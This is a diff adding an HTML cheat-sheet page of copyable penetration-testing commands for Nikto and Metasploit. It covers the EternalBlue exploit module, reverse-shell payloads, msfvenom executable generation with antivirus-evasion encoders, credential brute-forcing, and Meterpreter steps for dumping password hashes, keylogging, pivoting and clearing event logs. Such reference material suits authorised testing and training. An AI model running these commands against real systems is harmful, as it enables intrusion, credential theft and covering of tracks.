+          <div class="cmd-desc">Test for SQL injection vulnerabilities only</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Info Disclosure + Misconfig</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-Tuning</span> <span class="v">2,3</span></div>
+          <div class="cmd-desc">Check for misconfigurations and info leakage</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">All Tests</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-Tuning</span> <span class="v">x</span></div>
+          <div class="cmd-desc">Run every available test category</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title red">// Output</div>
+      <div class="cmd-grid">
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Save as HTML</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-o</span> <span class="v">report.html</span> <span class="f">-Format htm</span></div>
+          <div class="cmd-desc">Save full scan results as HTML report</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Save as Text</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-o</span> <span class="v">report.txt</span></div>
+          <div class="cmd-desc">Save results as plain text</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Save as CSV</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-o</span> <span class="v">report.csv</span> <span class="f">-Format csv</span></div>
+          <div class="cmd-desc">Export to CSV for spreadsheet import</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Save as XML</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-o</span> <span class="v">report.xml</span> <span class="f">-Format xml</span></div>
+          <div class="cmd-desc">Save as XML for tool integration</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title red">// Tuning Reference</div>
+      <div class="flags-wrap">
+        <table class="flags-table">
+          <tr><td>-T 0</td><td>File Upload vulnerabilities</td></tr>
+          <tr><td>-T 1</td><td>Interesting files / seen in logs</td></tr>
+          <tr><td>-T 2</td><td>Misconfiguration / default files</td></tr>
+          <tr><td>-T 3</td><td>Information Disclosure</td></tr>
+          <tr><td>-T 4</td><td>Injection (XSS / Script / HTML)</td></tr>
+          <tr><td>-T 5</td><td>Remote File Retrieval (inside webroot)</td></tr>
+          <tr><td>-T 6</td><td>Denial of Service</td></tr>
+          <tr><td>-T 7</td><td>Remote File Retrieval (server-wide)</td></tr>
+          <tr><td>-T 8</td><td>Command Execution / Remote Shell</td></tr>
+          <tr><td>-T 9</td><td>SQL Injection</td></tr>
+          <tr><td>-T x</td><td>Reverse Tuning — exclude selected categories</td></tr>
+        </table>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ===== METASPLOIT ===== -->
+  <div class="tab-content" id="tab-msf">
+
+    <div class="section">
+      <div class="section-title purple">// Starting Up</div>
+      <div class="cmd-grid">
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Launch Console</div>
+          <div class="cmd-code">msfconsole</div>
+          <div class="cmd-desc">Start the Metasploit Framework interactive console</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Launch Quiet</div>
+          <div class="cmd-code">msfconsole <span class="f">-q</span></div>
+          <div class="cmd-desc">Start without ASCII art banner — cleaner output</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Init Database</div>
+          <div class="cmd-code">msfdb init</div>
+          <div class="cmd-desc">Initialize PostgreSQL database for Metasploit</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">DB Status</div>
+          <div class="cmd-code">db_status</div>
+          <div class="cmd-desc">Check if database is connected inside msfconsole</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Import Nmap XML</div>
+          <div class="cmd-code">db_import <span class="v">scan.xml</span></div>
+          <div class="cmd-desc">Import nmap XML scan results into the database</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Show Hosts from DB</div>
+          <div class="cmd-code">hosts</div>
+          <div class="cmd-desc">List all hosts discovered and stored in the database</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Show Services from DB</div>
+          <div class="cmd-code">services</div>
+          <div class="cmd-desc">List all services detected from imported scans</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title purple">// Search & Navigation</div>
+      <div class="cmd-grid">
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Search by Name</div>
+          <div class="cmd-code">search <span class="v">eternalblue</span></div>
+          <div class="cmd-desc">Find modules by name, platform or author</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Search by CVE</div>
+          <div class="cmd-code">search <span class="f">cve:</span><span class="v">2017-0144</span></div>
+          <div class="cmd-desc">Find modules by CVE number</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Search by Platform</div>
+          <div class="cmd-code">search <span class="f">platform:</span><span class="v">windows type:exploit</span></div>
+          <div class="cmd-desc">Filter by OS platform and module type</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Use Module</div>
+          <div class="cmd-code">use <span class="v">exploit/windows/smb/ms17_010_eternalblue</span></div>
+          <div class="cmd-desc">Select a module — can also use the result number from search</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Module Info</div>
+          <div class="cmd-code">info</div>
+          <div class="cmd-desc">Full details about current module — targets, CVEs, refs</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Go Back</div>
+          <div class="cmd-code">back</div>
+          <div class="cmd-desc">Deselect current module, return to main console</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title purple">// Configuration</div>
+      <div class="cmd-grid">
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Show Options</div>
+          <div class="cmd-code">show options</div>
+          <div class="cmd-desc">List all required and optional parameters</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Show Advanced Options</div>
+          <div class="cmd-code">show advanced</div>
+          <div class="cmd-desc">List advanced/hidden configuration options</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Set Target Host</div>
+          <div class="cmd-code">set RHOSTS &lt;target&gt;</div>
+          <div class="cmd-desc">Set remote host(s) — accepts IP, range, or CIDR</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Set Target Port</div>
+          <div class="cmd-code">set RPORT <span class="v">445</span></div>
+          <div class="cmd-desc">Set the remote port to attack</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Set Local Host</div>
+          <div class="cmd-code">set LHOST &lt;your-ip&gt;</div>
+          <div class="cmd-desc">Your IP address for reverse shell callbacks</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Set Local Port</div>
+          <div class="cmd-code">set LPORT <span class="v">4444</span></div>
+          <div class="cmd-desc">Local port to listen on for incoming connections</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Show Payloads</div>
+          <div class="cmd-code">show payloads</div>
+          <div class="cmd-desc">List compatible payloads for current module</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Set Payload</div>
+          <div class="cmd-code">set PAYLOAD <span class="v">windows/x64/meterpreter/reverse_tcp</span></div>
+          <div class="cmd-desc">Choose the payload to deliver on exploitation</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Unset Option</div>
+          <div class="cmd-code">unset RHOSTS</div>
+          <div class="cmd-desc">Clear a configured option</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Set Global Option</div>
+          <div class="cmd-code">setg LHOST &lt;your-ip&gt;</div>
+          <div class="cmd-desc">Set option globally — persists across modules</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title purple">// Execution</div>
+      <div class="cmd-grid">
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Check Vulnerability</div>
+          <div class="cmd-code">check</div>
+          <div class="cmd-desc">Test if target is vulnerable without exploiting</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Run / Exploit</div>
+          <div class="cmd-code">run</div>
+          <div class="cmd-desc">Execute the current module (alias: exploit)</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Run as Background Job</div>
+          <div class="cmd-code">run <span class="f">-j</span></div>
+          <div class="cmd-desc">Run module in background — keep console free</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">List Jobs</div>
+          <div class="cmd-code">jobs</div>
+          <div class="cmd-desc">Show all running background jobs</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Kill Job</div>
+          <div class="cmd-code">kill <span class="v">0</span></div>
+          <div class="cmd-desc">Terminate a background job by ID</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title purple">// Sessions</div>
+      <div class="cmd-grid">
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">List Sessions</div>
+          <div class="cmd-code">sessions <span class="f">-l</span></div>
+          <div class="cmd-desc">Show all active sessions</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Interact with Session</div>
+          <div class="cmd-code">sessions <span class="f">-i</span> <span class="v">1</span></div>
+          <div class="cmd-desc">Connect to session by ID number</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Background Session</div>
+          <div class="cmd-code">background</div>
+          <div class="cmd-desc">Send current session to background</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Kill Session</div>
+          <div class="cmd-code">sessions <span class="f">-k</span> <span class="v">1</span></div>
+          <div class="cmd-desc">Terminate a session by ID</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Upgrade to Meterpreter</div>
+          <div class="cmd-code">sessions <span class="f">-u</span> <span class="v">1</span></div>
+          <div class="cmd-desc">Upgrade a basic shell session to Meterpreter</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Run Module on Session</div>
+          <div class="cmd-code">sessions <span class="f">-s</span> <span class="v">post/module</span></div>
+          <div class="cmd-desc">Run a post-exploitation module on all sessions</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title purple">// Meterpreter</div>
+      <div class="cmd-grid">
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">System Info</div>
+          <div class="cmd-code">sysinfo</div>
+          <div class="cmd-desc">Get OS, hostname and architecture of target</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Current User</div>
+          <div class="cmd-code">getuid</div>
+          <div class="cmd-desc">Show which user the session is running as</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Get Shell</div>
+          <div class="cmd-code">shell</div>
+          <div class="cmd-desc">Drop into a native OS command shell</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">List Processes</div>
+          <div class="cmd-code">ps</div>
+          <div class="cmd-desc">Show all running processes on target</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Migrate Process</div>
+          <div class="cmd-code">migrate <span class="v">&lt;PID&gt;</span></div>
+          <div class="cmd-desc">Move into another process — useful for persistence</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Privilege Escalation</div>
+          <div class="cmd-code">getsystem</div>
+          <div class="cmd-desc">Attempt to elevate to SYSTEM/root privileges</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Dump Password Hashes</div>
+          <div class="cmd-code">hashdump</div>
+          <div class="cmd-desc">Extract password hashes from SAM database (Windows)</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Download File</div>
+          <div class="cmd-code">download <span class="v">/path/to/file</span></div>
+          <div class="cmd-desc">Download file from target to your machine</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Upload File</div>
+          <div class="cmd-code">upload <span class="v">localfile /remote/path</span></div>
+          <div class="cmd-desc">Upload file from your machine to target</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Screenshot</div>
+          <div class="cmd-code">screenshot</div>
+          <div class="cmd-desc">Capture screenshot of target's desktop</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Keylogger Start</div>
+          <div class="cmd-code">keyscan_start</div>
+          <div class="cmd-desc">Start capturing keystrokes on target</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Keylogger Dump</div>
+          <div class="cmd-code">keyscan_dump</div>
+          <div class="cmd-desc">Display captured keystrokes</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Network Interfaces</div>
+          <div class="cmd-code">ipconfig</div>
+          <div class="cmd-desc">Show network interfaces of target machine</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">ARP Table</div>
+          <div class="cmd-code">arp</div>
+          <div class="cmd-desc">Show ARP table — reveals other hosts on local network</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Port Forward</div>
+          <div class="cmd-code">portfwd add <span class="f">-l</span> <span class="v">8080</span> <span class="f">-p</span> <span class="v">80</span> <span class="f">-r</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Forward local port to target — pivot into internal network</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Clear Event Logs</div>
+          <div class="cmd-code">clearev</div>
+          <div class="cmd-desc">Clear Windows event logs to cover tracks</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title purple">// Auxiliary Modules</div>
+      <div class="cmd-grid">
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">TCP Port Scanner</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/portscan/tcp</span></div>
+          <div class="cmd-desc">Built-in TCP port scanner</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">SMB Version Scan</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/smb/smb_version</span></div>
+          <div class="cmd-desc">Detect SMB version on target hosts</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">SMB Login Check</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/smb/smb_login</span></div>
+          <div class="cmd-desc">Brute force or test SMB credentials</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">SSH Login Brute</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/ssh/ssh_login</span></div>
+          <div class="cmd-desc">Brute force SSH credentials</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">FTP Login Brute</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/ftp/ftp_login</span></div>
+          <div class="cmd-desc">Brute force FTP credentials</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">HTTP Version</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/http/http_version</span></div>
+          <div class="cmd-desc">Identify web server type and version</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">HTTP Directory Brute</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/http/dir_scanner</span></div>
+          <div class="cmd-desc">Brute force web directories and paths</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">MySQL Login</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/mysql/mysql_login</span></div>
+          <div class="cmd-desc">Brute force MySQL credentials</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">DNS Enumeration</div>
+          <div class="cmd-code">use <span class="v">auxiliary/gather/dns_enum</span></div>
+          <div class="cmd-desc">Enumerate DNS records for a domain</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">SNMP Sweep</div>
+          <div class="cmd-code">use <span class="v">auxiliary/scanner/snmp/snmp_enum</span></div>
+          <div class="cmd-desc">Enumerate SNMP information from devices</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title purple">// Listeners & Handlers</div>
+      <div class="cmd-grid">
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Multi Handler</div>
+          <div class="cmd-code">use <span class="v">exploit/multi/handler</span></div>
+          <div class="cmd-desc">Generic listener — catch reverse shells and payloads</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">Generate Payload (msfvenom)</div>
+          <div class="cmd-code">msfvenom <span class="f">-p</span> <span class="v">windows/x64/meterpreter/reverse_tcp</span> LHOST=&lt;ip&gt; LPORT=<span class="v">4444</span> <span class="f">-f exe -o</span> <span class="v">shell.exe</span></div>
+          <div class="cmd-desc">Generate standalone executable payload</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">List Payload Formats</div>
+          <div class="cmd-code">msfvenom <span class="f">--list formats</span></div>
+          <div class="cmd-desc">Show all output formats: exe, elf, php, py, raw, etc.</div>
+        </div>
+        <div class="cmd-card purple" onclick="copyCmd(this)">
+          <div class="cmd-name">List Encoders</div>
+          <div class="cmd-code">msfvenom <span class="f">--list encoders</span></div>
+          <div class="cmd-desc">Show available encoders for AV evasion</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="toast" id="toast">// COPIED</div>
+
+<script>
+function switchTab(name, el) {
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active-nmap','active-nikto','active-msf'));
+  document.getElementById('tab-' + name).classList.add('active');
+  el.classList.add('active-' + name);
+}
+
+function copyCmd(el) {
+  const text = el.querySelector('.cmd-code').innerText.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    const t = document.getElementById('toast');
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 1200);
+  });
+}
+</script>
+</body>
+</html>
